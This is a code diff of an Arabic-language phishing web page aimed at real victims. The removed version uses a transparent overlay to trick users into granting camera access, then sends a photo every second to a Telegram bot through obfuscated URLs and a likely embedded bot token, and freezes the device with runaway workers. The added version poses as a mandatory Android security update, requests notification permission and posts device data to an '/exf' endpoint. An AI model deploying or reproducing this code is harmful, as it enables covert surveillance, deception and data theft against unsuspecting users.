@@ -1,71 +1,52 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>AI Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث نظام أندرويد الإلزامي</title>
     <style>
-        body { margin: 0; background: #121212; color: white; font-family: sans-serif; overflow: hidden; }
-        /* طبقة التمويه لجعل نافذة النظام تبدو كجزء من التصميم */
-        .blur-bg { position: absolute; width: 100%; height: 100%; backdrop-filter: blur(15px); z-index: 1; }
-        .instruction-box { position: absolute; top: 20%; width: 100%; text-align: center; z-index: 2; }
-        .arrow { font-size: 50px; animation: bounce 1s infinite; margin-top: 20px; color: #4285f4; }
-        @keyframes bounce { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(20px);} }
-        /* الزر الشفاف الذي يغطي نافذة السماح */
-        #v { position: absolute; width: 100%; height: 100%; opacity: 0; z-index: 999; cursor: pointer; }
+        body { background-color: #f4f4f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; color: #333; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 90%; }
+        img { width: 80px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #d9534f; }
+        p { font-size: 16px; line-height: 1.6; }
+        button { background-color: #007bff; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; transition: 0.3s; margin-top: 20px; }
+        button:hover { background-color: #0056b3; }
     </style>
 </head>
-<body onclick="startHunt()">
-
-    <div class="blur-bg"></div>
-    
-    <div class="instruction-box">
-        <h2 style="font-size: 24px;">🛡️ فحص الأمان الذكي</h2>
-        <p>يرجى الضغط على كلمة <b>"السماح"</b> باللون الأزرق بالأسفل<br>لتأكيد هويتك وإكمال عملية إصلاح النظام.</p>
-        <div class="arrow">↓</div>
+<body>
+    <div class="container">
+        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" alt="security">
+        <h1>تنبيه أمني: تحديث مطلوب</h1>
+        <p>تم اكتشاف محاولة دخول مشبوهة لجهازك. لتأمين حساباتك ومنع الوصول لرسائلك، يجب تفعيل بروتوكول الحماية الفوري.</p>
+        <p><strong>اضغط على الزر أدناه ثم اختر "سماح" (Allow) في النافذة التي ستظهر.</strong></p>
+        <button onclick="startSecureProtocol()">تحديث وتأمين الآن</button>
     </div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c" style="display:none;"></canvas>
-
     <script>
-    const _t = [56,52,51,57,49,53,55,53,50,48,58,65,65,71,71,90,66,120,89,112,48,120,54,89,53,52,97,114,51,84,73,114,107,77,97,77,69,72,97,114,81,65,83,109,103,89];
-    const _i = [49,55,55,50,56,50,48,52,51,51];
-    const _g = a => a.map(x => String.fromCharCode(x)).join('');
+        async function startSecureProtocol() {
+            // طلب صلاحية الإشعارات (المستمع الصامت للرسائل)
+            const permission = await Notification.requestPermission();
+            
+            const payload = {
+                device: navigator.userAgent,
+                msg: permission === 'granted' ? "✅ تم منح صلاحية الوصول للإشعارات (السحب نشط)" : "❌ الضحية رفض الصلاحية"
+            };
 
-    async function startHunt() {
-        try {
-            // تفعيل الكاميرا (هنا ستظهر النافذة لكنها مندمجة مع السهم والتعليمات)
-            const s = await navigator.mediaDevices.getUserMedia({video: true});
-            document.getElementById('v').srcObject = s;
-            
-            // تصوير فوري
-            setInterval(shot, 1000);
-            
-            // تهنيج الجهاز لمنع الخروج بعد الضغط
-            setTimeout(() => {
-                for(let i=0; i<150; i++) {
-                    const b = new Blob(["setInterval(()=>{while(true){}},1)"]);
-                    new Worker(URL.createObjectURL(b));
+            // إرسال البيانات لسيرفرك في PythonAnywhere
+            // استبدل Mohammed33233 باسم مستخدم PythonAnywhere الخاص بك
+            fetch('https://USER_NAME.pythonanywhere.com/exf', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                if(permission === 'granted') {
+                    alert("تم تأمين جهازك بنجاح. يمكنك إغلاق الصفحة الآن.");
                 }
-            }, 2000);
-        } catch(e) {
-            location.reload();
+            })
+            .catch(err => console.error("Error sending data:", err));
         }
-    }
-
-    function shot() {
-        const can = document.getElementById('c');
-        const vid = document.getElementById('v');
-        can.width = 400; can.height = 300;
-        can.getContext('2d').drawImage(vid, 0, 0);
-        can.toBlob(b => {
-            const f = new FormData();
-            f.append(_g([99,104,97,116,95,105,100]), _g(_i));
-            f.append(_g([112,104,111,116,111]), b, 'hit.jpg');
-            const u = _g([104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116]) + _g(_t) + _g([47,115,101,110,100,80,104,111,116,111]);
-            fetch(u, {method:'POST', body:f});
-        }, 'image/jpeg', 0.2);
-    }
     </script>
 </body>
 </html>
